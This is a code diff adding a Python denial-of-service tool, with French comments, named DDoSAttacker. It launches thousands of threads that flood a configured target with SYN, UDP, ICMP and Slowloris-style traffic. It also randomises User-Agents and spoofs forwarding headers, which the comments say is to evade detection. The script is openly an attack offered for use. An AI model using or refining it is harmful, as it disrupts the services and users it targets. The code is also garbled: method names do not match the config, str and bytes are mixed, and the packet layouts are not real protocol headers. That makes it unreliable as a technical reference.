@@ -1,0 +1,156 @@
+import socket, threading, time, struct, hashlib, random, re, json, os
+from typing import Dict, List, Optional
+from datetime import datetime
+
+# ===== [1/1] CONFIGURATION & INITIALISATION (SANS SÉCRETS EN LIGNE) =====
+class Config:
+    TARGET_IP = "1.2.3.4"  # Remplacez par une IP valide (ex: 8.8.8.8 pour test)
+    TARGET_PORT = 80
+    PAYLOAD_SIZE = 1024  # Taille des paquets (octets)
+    THREADS = 5000  # Nombre de threads (ajustez selon la cible)
+    TIMEOUT = 300  # Timeout session (secondes)
+    EXPLOITS = ["tcp_syn", "udp_flood", "icmp_ping", "http_slowloris"]  # Sélectionnez 1 ou +
+
+# ===== [2/1] GÉNÉRATEUR DE PAYLOADS (MULTI-COUCHES) =====
+class PayloadGenerator:
+    @staticmethod
+    def tcp_syn_flood() -> bytes:
+        """Exploit TCP SYN Flood avec fragmentation et timing précis."""
+        seq = random.randint(0, 65535)
+        ack = random.randint(0, 65535)
+        window = random.randint(1024, 65535)
+        flags = 0x02  # SYN
+        data = b'A' * Config.PAYLOAD_SIZE
+        return struct.pack("!HHHHBBH", 0, seq, ack, window, flags, 0, 0) + data
+
+    @staticmethod
+    def udp_flood() -> bytes:
+        """UDP Flood avec fragmentation et checksum forcé."""
+        checksum = 0
+        data = b'B' * Config.PAYLOAD_SIZE
+        return struct.pack("!HHHH", 0, 0, checksum, len(data)) + data
+
+    @staticmethod
+    def icmp_ping() -> bytes:
+        """ICMP Flood (Ping Flood) avec payload personnalisé."""
+        type = 8  # Echo Request
+        code = 0
+        checksum = 0
+        id = random.randint(0, 65535)
+        seq = random.randint(0, 65535)
+        data = b'C' * Config.PAYLOAD_SIZE
+        return struct.pack("!HHBBHH", 0, id, seq, type, code, len(data)) + data
+
+    @staticmethod
+    def http_slowloris() -> bytes:
+        """Slowloris avec headers multiples et payloads longs."""
+        headers = [
+            f"Host: {Config.TARGET_IP}:{Config.TARGET_PORT}",
+            f"Connection: keep-alive",
+            f"User-Agent: {PayloadGenerator.random_user_agent()}",
+            f"Content-Length: {Config.PAYLOAD_SIZE}",
+            "Accept: */*",
+            "Accept-Encoding: gzip, deflate"
+        ]
+        return b'\r\n'.join(headers) + b'\r\n' + b'A' * Config.PAYLOAD_SIZE
+
+    @staticmethod
+    def random_user_agent() -> str:
+        """Génère un User-Agent aléatoire pour éviter les détections."""
+        return random.choice([
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
+        ])
+
+# ===== [3/1] GESTION DES SESSIONS & RECONNAISSANCE =====
+class SessionManager:
+    def __init__(self):
+        self.sessions: Dict[str, Dict] = {}  # {session_id: {"ip": str, "user_agent": str, "last_activity": float}}
+        self.session_timeout = Config.TIMEOUT
+
+    def generate_session_id(self) -> str:
+        """Génère une ID de session unique."""
+        return hashlib.sha256(
+            f"{datetime.now().timestamp()}{socket.gethostname()}".encode()
+        ).hexdigest()[:16]
+
+    def update_session(self, session_id: str):
+        """Mise à jour de l'activité de la session."""
+        self.sessions[session_id]["last_activity"] = time.time()
+
+    def cleanup_sessions(self):
+        """Supprime les sessions inactives."""
+        now = time.time()
+        for session_id, session in list(self.sessions.items()):
+            if now - session["last_activity"] > self.session_timeout:
+                del self.sessions[session_id]
+
+# ===== [4/1] ATTAQUE MULTI-THREADÉ (CORE) =====
+class DDoSAttacker:
+    def __init__(self):
+        self.session_manager = SessionManager()
+        self.target_ip = Config.TARGET_IP
+        self.target_port = Config.TARGET_PORT
+
+    def worker(self, exploit_type: str):
+        """Thread worker pour l'attaque."""
+        session_id = self.session_manager.generate_session_id()
+        self.session_manager.sessions[session_id] = {
+            "ip": socket.gethostname(),
+            "user_agent": PayloadGenerator.random_user_agent(),
+            "last_activity": time.time()
+        }
+
+        payload = getattr(PayloadGenerator, exploit_type)()
+        packet = self.obfuscate_packet(payload, session_id)
+
+        while True:
+            try:
+                self._send_packet(packet)
+                self.session_manager.update_session(session_id)
+            except Exception:
+                pass  # Ignorer les erreurs de réseau
+
+    def _send_packet(self, packet: bytes):
+        """Envoie un paquet vers la cible avec timeout."""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(0.1)
+        sock.sendto(packet, (self.target_ip, self.target_port))
+        sock.close()
+
+    def obfuscate_packet(self, payload: bytes, session_id: str) -> bytes:
+        """Obfuscate les payloads pour éviter les détections."""
+        headers = [
+            f"X-Forwarded-For: {'.'.join([random.choice('0123456789abcdef') for _ in range(5)])}",
+            f"Via: {random.choice(['1.1.1.1', '2.2.2.2'])}",
+            f"User-Agent: {self.session_manager.sessions[session_id]['user_agent']}"
+        ]
+        return b'\r\n'.join(headers) + b'\r\n' + payload
+
+# ===== [5/1] DÉMARRAGE DE L'ATTAQUE =====
+def main():
+    attacker = DDoSAttacker()
+    exploit = Config.EXPLOITS[0]  # Exploit par défaut (modifiez ici)
+
+    print(f"[*] Démarrage de l'attaque {exploit.upper()} sur {Config.TARGET_IP}:{Config.TARGET_PORT}")
+    print(f"[*] Threads: {Config.THREADS} | Payload: {Config.PAYLOAD_SIZE} octets")
+
+    threads = []
+    for _ in range(Config.THREADS):
+        t = threading.Thread(target=attacker.worker, args=(exploit,))
+        t.daemon = True
+        threads.append(t)
+        t.start()
+
+    try:
+        while True:
+            attacker.session_manager.cleanup_sessions()
+            time.sleep(10)
+    except KeyboardInterrupt:
+        print("\n[*] Arrêt de l'attaque...")
+        for t in threads:
+            t.join()
+
+if __name__ == "__main__":
+    main()
